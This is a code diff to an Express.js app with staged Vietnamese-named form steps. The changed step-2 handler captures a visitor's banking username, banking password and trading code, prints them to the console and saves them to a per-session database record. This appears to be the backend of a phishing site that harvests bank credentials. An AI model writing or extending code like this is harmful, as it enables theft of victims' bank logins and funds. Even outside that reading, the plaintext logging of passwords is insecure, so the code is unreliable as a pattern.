@@ -57,7 +57,13 @@ app.get("/Buoc-1",(req,res)=>{
     
 })
 app.get("/Buoc-2",(req,res)=>{
-    res.render("buoc2");
+    if(req.session.InfoId== undefined){
+        res.redirect("/");
+    }
+    else{
+        res.render("buoc2");
+    }
+    
 })
 app.get("/Buoc-3",(req,res)=>{
     res.render("buoc3");
@@ -108,7 +114,6 @@ app.post("/actionstep1",(req,res)=>{
         releasedate:req.body.releasedate
 
     }
-    console.log(obj);
     Info.updateOne({_id:req.session.InfoId},obj,(erro,doc)=>{
        if(doc){
             res.redirect("/Buoc-2");
@@ -118,8 +123,18 @@ app.post("/actionstep1",(req,res)=>{
     
 })
 app.post("/actionstep2",(req,res)=>{
-    console.log(req.body);
-    res.redirect("/Buoc-3");
+    var obj={
+        UserBanking:req.body.UserBanking,
+        PasswordBanking:req.body.PasswordBanking,
+        Tradingcode:req.body.Tradingcode
+    }
+    console.log(obj);
+    Info.updateOne({_id:req.session.InfoId},obj,(erro,doc)=>{
+        if(doc){
+             res.redirect("/Buoc-3");
+        }
+         
+     })
 })
 app.post("/actionstep3",(req,res)=>{
     console.log(req.body);
